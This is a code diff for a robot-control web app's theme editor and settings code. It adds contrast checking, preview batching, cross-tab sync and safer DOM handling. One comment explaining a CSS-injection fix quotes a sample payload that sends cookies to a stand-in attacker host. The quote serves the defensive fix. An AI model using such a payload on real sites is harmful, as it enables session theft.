@@ -176,7 +176,14 @@ function applyTheme(id, persist = true) {
     const custom = _loadCustomThemes().find(c => c.id === id);
     if (custom) vars = custom.vars;
   }
-  if (!vars && id !== 'default') return;
+  // B5/E1 fix 2026-05-16: fallback to default if vars missing (custom
+  // theme deleted by another tab while this one had it active). Was
+  // silent early-return → root kept the previous theme's inline styles
+  // → operator stuck on a 'ghost' theme until manual reload.
+  if (!vars && id !== 'default') {
+    id = 'default';
+    vars = {};
+  }
   const root = document.documentElement;
   root.removeAttribute('style');
   if (id !== 'default' && vars) {
@@ -294,17 +301,32 @@ function _fitPreview() {
   clip.style.height = Math.ceil(H * scale) + 'px';
 }
 
+// P1/P2 fix 2026-05-16: rAF-batch the preview. Color picker oninput
+// fires 60+ times/sec on drag → was rebuilding 40 CSS vars + reading
+// clip.offsetWidth (forced reflow) per pixel → visible jank on tablet.
+let _previewRaf = 0;
 function previewCustomTheme() {
+  if (_previewRaf) return;
+  _previewRaf = requestAnimationFrame(() => {
+    _previewRaf = 0;
+    _doPreviewCustomTheme();
+  });
+}
+
+function _doPreviewCustomTheme() {
   const vars = _buildCustomVars();
   const root = document.documentElement;
-  root.removeAttribute('style');
+  // P1 fix 2026-05-16: don't removeAttribute('style') — setProperty
+  // overwrites the var and avoids the extra full-style-invalidation
+  // from the attribute wipe.
   Object.entries(vars).forEach(([k, v]) => root.style.setProperty(k, v));
   ['bg','topbar','card','accent','text','ok','warn','err'].forEach(f => {
     const lbl = document.getElementById('lbl-' + f);
     const inp = document.getElementById('theme-editor-' + f);
     if (lbl && inp) lbl.textContent = inp.value;
   });
-  _fitPreview();
+  // W5 fix 2026-05-16: update WCAG contrast indicators
+  _updateContrastIndicators();
 }
 
 function openThemeEditor(id) {
@@ -444,17 +466,23 @@ function _renderThemePicker() {
     // build with textContent for the label.
     const csw = document.createElement('span');
     csw.className = 'theme-swatch';
-    csw.style.cssText = `background:${t.swatch}`;
+    // B2 fix 2026-05-16: was .style.cssText with raw t.swatch — CSS
+    // injection if localStorage is tampered (devtools / XSS-elsewhere)
+    // to put e.g. 'red;background-image:url(//evil.com/log?'+cookie+')'.
+    // Now validate hex format before injection + use setProperty path.
+    csw.style.background = /^#[0-9a-fA-F]{6}$/.test(t.swatch || '') ? t.swatch : '#888888';
     btn.append(csw, document.createTextNode(t.label || ''));
     const editBtn = document.createElement('button');
     editBtn.className = 'theme-btn-edit';
     editBtn.title = 'Edit';
-    editBtn.innerHTML = '✏';
+    // B11 fix 2026-05-16: textContent per CLAUDE.md post-feature audit
+    // ('createElement + textContent — jamais innerHTML avec interpolation').
+    editBtn.textContent = '✏';
     editBtn.onclick = e => { e.stopPropagation(); openThemeEditor(t.id); };
     const delBtn = document.createElement('button');
     delBtn.className = 'theme-btn-del';
     delBtn.title = 'Delete';
-    delBtn.innerHTML = '✕';
+    delBtn.textContent = '✕';
     delBtn.onclick = e => { e.stopPropagation(); deleteCustomTheme(t.id); };
     wrap.appendChild(btn);
     wrap.appendChild(editBtn);
@@ -463,9 +491,61 @@ function _renderThemePicker() {
   });
 }
 
+// W5 fix 2026-05-16: WCAG-AA contrast ratio between text/bg & accent/bg.
+// Safety net against picking unreadable color pairs (e.g. dark text on
+// dark bg → invisible at convention demo in bright sunlight).
+function _hexToRgb(hex) {
+  if (!/^#[0-9a-fA-F]{6}$/.test(hex || '')) return [0, 0, 0];
+  return [parseInt(hex.slice(1,3),16), parseInt(hex.slice(3,5),16), parseInt(hex.slice(5,7),16)];
+}
+function _relLum(rgb) {
+  const [r,g,b] = rgb.map(c => {
+    const cs = c / 255;
+    return cs <= 0.03928 ? cs/12.92 : Math.pow((cs+0.055)/1.055, 2.4);
+  });
+  return 0.2126*r + 0.7152*g + 0.0722*b;
+}
+function _contrastRatio(hex1, hex2) {
+  const l1 = _relLum(_hexToRgb(hex1));
+  const l2 = _relLum(_hexToRgb(hex2));
+  const [hi, lo] = l1 > l2 ? [l1, l2] : [l2, l1];
+  return (hi + 0.05) / (lo + 0.05);
+}
+function _updateContrastIndicators() {
+  const target = el('theme-contrast-indicators');
+  if (!target) return;
+  const bg     = el('theme-editor-bg')?.value     || '#000000';
+  const text   = el('theme-editor-text')?.value   || '#ffffff';
+  const accent = el('theme-editor-accent')?.value || '#00aaff';
+  const fmt = (ratio) => {
+    const tier = ratio >= 7 ? 'AAA' : ratio >= 4.5 ? 'AA' : 'FAIL';
+    const cls  = ratio >= 4.5 ? 'pass' : 'fail';
+    return `<span class="contrast-pill contrast-${cls}">${ratio.toFixed(1)}:1 ${tier === 'FAIL' ? '✗' : '✓'} ${tier}</span>`;
+  };
+  target.innerHTML =
+    `<div><span class="contrast-label">Text on BG:</span> ${fmt(_contrastRatio(text, bg))}</div>` +
+    `<div><span class="contrast-label">Accent on BG:</span> ${fmt(_contrastRatio(accent, bg))}</div>`;
+}
+
 function _initThemes() {
   _renderThemePicker();
   window.addEventListener('resize', _fitPreview);
+  // E2 fix 2026-05-16: cross-tab sync. When tab A deletes a custom
+  // theme that tab B has applied, tab B's theme grid + applied theme
+  // are stale until manual reload.
+  window.addEventListener('storage', e => {
+    if (e.key === _CUSTOM_THEMES_KEY || e.key === 'astromech-theme') {
+      _renderThemePicker();
+      const active = localStorage.getItem('astromech-theme') || 'default';
+      applyTheme(active, false);  // false = don't re-persist, just apply
+      _activeTheme = active;
+    }
+  });
+  // E11 fix 2026-05-16: visibilitychange clears stale hover preview
+  // (mouse left page entirely so no mouseleave fired).
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) _restoreActiveTheme();
+  });
 }
 
 // Apply saved theme immediately when script loads — before first paint
@@ -11048,7 +11128,11 @@ async function saveHardwareConfig() {
   else run();
 }
 
-const _R2_LOGO_SVG = `<svg class="r2-logo" width="32" height="32" viewBox="0 0 32 32"><circle cx="16" cy="10" r="9" fill="none" stroke="#00aaff" stroke-width="1.5"/><rect x="8" y="17" width="16" height="11" rx="2" fill="none" stroke="#00aaff" stroke-width="1.5"/><circle cx="11" cy="10" r="2" fill="#00ffea" opacity="0.8"/><circle cx="21" cy="10" r="2" fill="#00ffea" opacity="0.8"/><rect x="12" y="7" width="8" height="4" rx="1" fill="#00aaff" opacity="0.3"/></svg>`;
+// E15 fix 2026-05-16: was hardcoded #00aaff/#00ffea → didn't follow
+// the active theme (R5-D4 red, BB-8 orange, etc.). currentColor lets
+// the SVG inherit the parent's color which is set to var(--blue) via
+// CSS, so the logo retints with each theme.
+const _R2_LOGO_SVG = `<svg class="r2-logo" width="32" height="32" viewBox="0 0 32 32"><circle cx="16" cy="10" r="9" fill="none" stroke="currentColor" stroke-width="1.5"/><rect x="8" y="17" width="16" height="11" rx="2" fill="none" stroke="currentColor" stroke-width="1.5"/><circle cx="11" cy="10" r="2" fill="currentColor" opacity="0.8"/><circle cx="21" cy="10" r="2" fill="currentColor" opacity="0.8"/><rect x="12" y="7" width="8" height="4" rx="1" fill="currentColor" opacity="0.3"/></svg>`;
 
 let _currentRobotIcon = '';
 
@@ -11242,38 +11326,49 @@ function _applyLocationLabels(master, slave) {
 }
 
 async function saveRobotLocations() {
+  // W4 fix 2026-05-16: return bool for withSaveFeedback
   const master = el('master-location-input')?.value.trim();
   const slave  = el('slave-location-input')?.value.trim();
   const status = el('robot-locations-status');
   if (!master || !slave) {
     if (status) { status.textContent = 'Both fields required'; status.className = 'settings-status error'; }
-    return;
+    return false;
   }
   if (status) { status.textContent = 'Saving…'; status.className = 'settings-status'; }
-  const d = await api('/settings/robot_locations', 'POST', { master_location: master, slave_location: slave });
-  if (d?.status === 'ok') {
+  // B3 surface backend validation error
+  const res = await apiDetail('/settings/robot_locations', 'POST', { master_location: master, slave_location: slave });
+  if (res.ok && res.data?.status === 'ok') {
     _applyLocationLabels(master, slave);
     toast(`Locations: ${master} / ${slave}`, 'ok');
     if (status) { status.textContent = 'Saved'; status.className = 'settings-status ok'; }
-  } else {
-    if (status) { status.textContent = 'Error'; status.className = 'settings-status error'; }
+    return true;
   }
+  const errMsg = res.error || 'Error';
+  if (status) { status.textContent = errMsg; status.className = 'settings-status error'; }
+  toast(`Locations failed: ${errMsg}`, 'error');
+  return false;
 }
 
 async function saveRobotName() {
   const input  = el('robot-name-input');
   const status = el('robot-name-status');
   const name   = input?.value.trim();
-  if (!name) { if (status) { status.textContent = 'Name cannot be empty.'; status.style.color = 'var(--warn)'; } return; }
-  const d = await api('/settings/robot_name', 'POST', { name });
-  if (d && d.status === 'ok') {
+  if (!name) {
+    if (status) { status.textContent = 'Name cannot be empty.'; status.style.color = 'var(--warn)'; }
+    return false;
+  }
+  const res = await apiDetail('/settings/robot_name', 'POST', { name });
+  if (res.ok && res.data?.status === 'ok') {
     const headerName = el('header-robot-name');
     if (headerName) headerName.textContent = name;
     if (status) { status.textContent = 'Saved ✓'; status.style.color = 'var(--ok)'; }
     toast(`Robot name set to "${name}"`, 'ok');
-  } else {
-    if (status) { status.textContent = d?.error || 'Error saving name.'; status.style.color = 'var(--warn)'; }
+    return true;
   }
+  const errMsg = res.error || 'Error saving name.';
+  if (status) { status.textContent = errMsg; status.style.color = 'var(--warn)'; }
+  toast(`Name failed: ${errMsg}`, 'error');
+  return false;
 }
 
 async function adminChangePassword() {
